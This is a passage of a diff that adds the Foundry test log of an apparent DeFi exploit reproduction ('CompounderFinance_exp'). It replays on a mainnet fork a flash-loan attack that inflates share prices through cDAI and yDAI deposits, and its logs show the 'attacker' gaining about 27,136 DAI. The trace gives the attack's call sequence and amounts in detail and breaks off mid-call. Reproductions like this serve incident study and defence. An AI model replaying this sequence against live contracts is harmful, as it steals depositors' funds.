@@ -1,0 +1,1337 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/CompounderFinance_exp.sol:ContractTest
+[PASS] testExploit() (gas: 3332456)
+Logs:
+  Attacker amount of DAI before hack: 0.000000000000000000
+  Attacker amount of DAI after hack: 27136.844226131084991970
+
+Traces:
+  [35713] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 17426064 [1.742e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], "DAI")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1], "cDAI")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01], "yDAI")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e], "yUSDC")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D], "yUSDT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f], "yTUSD")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], "CentreUSDC")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(DAIUSDCPool: [0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168], "DAIUSDCPool")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], "CurveFiSwap")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], "StrategyDAICurve")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [3749256] ContractTest::testExploit()
+    ├─ [2602] DAI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [240] DAI::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker amount of DAI before hack", val: 0, decimals: 18)
+    ├─ [3726197] DAIUSDCPool::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1239990000000000000000000 [1.239e24], 0, 0x)
+    │   ├─ [2602] DAI::balanceOf(DAIUSDCPool: [0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168]) [staticcall]
+    │   │   └─ ← [Return] 49018693310034167759438802 [4.901e25]
+    │   ├─ [9815] CentreUSDC::balanceOf(DAIUSDCPool: [0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168]) [staticcall]
+    │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(DAIUSDCPool: [0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168]) [delegatecall]
+    │   │   │   └─ ← [Return] 58894222347232 [5.889e13]
+    │   │   └─ ← [Return] 58894222347232 [5.889e13]
+    │   ├─ [26174] DAI::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1239990000000000000000000 [1.239e24])
+    │   │   ├─ emit Transfer(from: DAIUSDCPool: [0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1239990000000000000000000 [1.239e24])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0 → 0x000000000000000000000000000000000000000000010693fe1a9369cd180000
+    │   │   │   @ 0x0c851915448d0d1d564ff8d739c8d78544db77078755e108c40f2957369677fa: 0x000000000000000000000000000000000000000000288c1cb05f7c286f7d03d2 → 0x000000000000000000000000000000000000000000278588b244e8bea26503d2
+    │   │   └─ ← [Return] true
+    │   ├─ [3661000] ContractTest::uniswapV3FlashCallback(123999000000000000000 [1.239e20], 0, 0x)
+    │   │   ├─ [24514] DAI::approve(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xa34922e63a903fd575db3dcc2fd57e86e6658c68e4f20cf43820c5e5950a5392: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [24514] DAI::approve(cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xf3fb211f41d42dbde4161f534b9c0ac70a070b5724fa7846a6c35b856b9ad0d5: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [25361] yDAI::approve(CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xd4323eae345c302632428595ef8598a8d956b13b06a6fc8511bc488b90519d29: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [25361] yUSDC::approve(CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xd4323eae345c302632428595ef8598a8d956b13b06a6fc8511bc488b90519d29: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [25361] yUSDT::approve(CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xd4323eae345c302632428595ef8598a8d956b13b06a6fc8511bc488b90519d29: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [25361] yTUSD::approve(CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xd4323eae345c302632428595ef8598a8d956b13b06a6fc8511bc488b90519d29: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [521521] cDAI::deposit(200000000000000000000000 [2e23], false)
+    │   │   │   ├─ [470157] 0x0b283B107F70d23250f882fbfe7216C38abBd7cA::balanceOf(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   ├─ [464746] StrategyDAICurve::balanceOf() [staticcall]
+    │   │   │   │   │   ├─ [417987] CurveFiSwap::get_virtual_price() [staticcall]
+    │   │   │   │   │   │   ├─ [117413] yDAI::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   │   │   ├─ [2602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 14696242399124404845345 [1.469e22]
+    │   │   │   │   │   │   │   ├─ [33496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [15812] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [8569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   │   │   │   │   ├─ [35672] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [4111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [2509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [11273] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [8757] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [2600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 1133752629097174055 [1.133e18]
+    │   │   │   │   │   │   ├─ [87406] yUSDC::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   │   │   ├─ [3315] CentreUSDC::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   │   │   │   ├─ [24496] 0x9bA00D6856a4eDF4665BcA2C2309936572473B7E::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [9312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [8569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   │   │   │   └─ ← [Return] 356118867834 [3.561e11]
+    │   │   │   │   │   │   │   ├─ [25172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0), 2) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101138810 [2.101e9], 815523096620 [8.155e11]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000f952a0
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [2509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [2553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 1259083362487637320 [1.259e18]
+    │   │   │   │   │   │   ├─ [74576] yUSDT::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   │   │   ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 40817840891 [4.081e10]
+    │   │   │   │   │   │   │   ├─ [4803] 0x71fc860F7D3A592A4a98740e39dB31d25db65ae8::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [25130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0), 0) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [2509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [7780] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [6257] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::delegateToImplementation(0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [2600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 7983010 [7.983e6]
+    │   │   │   │   │   │   ├─ [83690] yTUSD::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   │   │   ├─ [7685] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2486] 0xB650eb28d35691dd1BD481325D40E65273844F9b::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   │   │   │   ├─ [24496] 0x4DA9b813057D04BAef4e5800E36083717b4a0341::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [9312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [8569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   │   │   │   └─ ← [Return] 280671118812599902212786 [2.806e23]
+    │   │   │   │   │   │   │   ├─ [17130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x73a052500105205d34Daf004eAb301916DA8190f, 0), 0) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [2509] 0x49f4592E641820e928F9919Ef4aBd92a719B4b49::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [2553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 1239753704121538299 [1.239e18]
+    │   │   │   │   │   │   ├─ [2291] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 22989947475064086245493519 [2.298e25]
+    │   │   │   │   │   │   └─ ← [Return] 11368624850042939 [1.136e16]
+    │   │   │   │   │   ├─ [33890] 0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   │   ├─ [20344] 0x9E65Ad11b299CA0Abefc2799dDB6314Ef2d91080::balanceOf(0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8) [staticcall]
+    │   │   │   │   │   │   │   ├─ [14816] 0x07DB4B9b3951094B9E278D336aDf46a036295DE7::balanceOf() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [6165] 0x96Dd07B6c99b22F3f0cB1836aFF8530a98BDe9E3::balanceOf(0xFA712EE4788C042e2B7BB55E6cb8ec569C4530c1) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [2805] 0xFA712EE4788C042e2B7BB55E6cb8ec569C4530c1::balanceOf(0xdc66DBa57c6f9213c641a8a216f8C3D9d83573cd) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   ├─ [2736] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::balanceOf(0x07DB4B9b3951094B9E278D336aDf46a036295DE7) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [2736] 0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8::balanceOf(0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2023382049364173638711357 [2.023e24]
+    │   │   │   │   │   │   └─ ← [Return] 1173186183069336025 [1.173e18]
+    │   │   │   │   │   ├─ [2629] 0x5dbcF33D8c2E976c6b560249878e6F1491Bca25c::balanceOf(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [2602] DAI::balanceOf(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [2602] DAI::balanceOf(cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 32636917796108185967118 [3.263e22]
+    │   │   │   ├─ [602] DAI::balanceOf(cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 32636917796108185967118 [3.263e22]
+    │   │   │   ├─ [6618] DAI::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1], 200000000000000000000000 [2e23])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1], value: 200000000000000000000000 [2e23])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0x000000000000000000000000000000000000000000010693fe1a9369cd180000 → 0x00000000000000000000000000000000000000000000dc39f88ad0d3e0180000
+    │   │   │   │   │   @ 0xd9eb8dc48eb8490da88a5fbe127c3f81b05e4793a54b4894f39875603a8fd31d: 0x0000000000000000000000000000000000000000000006e9403849c24d191a0e → 0x00000000000000000000000000000000000000000000314345c80c583a191a0e
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [602] DAI::balanceOf(cDAI: [0x2381742592ab54dC2e89f193AF682D914A8b24C1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 232636917796108185967118 [2.326e23]
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1342703033514129291125012 [1.342e24])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 2: 0x000000000000000000000000000000000000000000002e65e479551960d9b5db → 0x000000000000000000000000000000000000000000014ab9f84310a3629056ef
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x000000000000000000000000000000000000000000011c5413c9bb8a01b6a114
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [116950] yDAI::deposit(1000000000000000000000000 [1e24])
+    │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   └─ ← [Return] 14696242399124404845345 [1.469e22]
+    │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [6618] DAI::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01], 1000000000000000000000000 [1e24])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01], value: 1000000000000000000000000 [1e24])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x2f02e106f5b3861b492ce5b389aa055016767262bc75b54222e7a679bd4d603f: 0x00000000000000000000000000000000000000000000031caf5565f96ca43b21 → 0x00000000000000000000000000000000000000000000d6decb2432e70da43b21
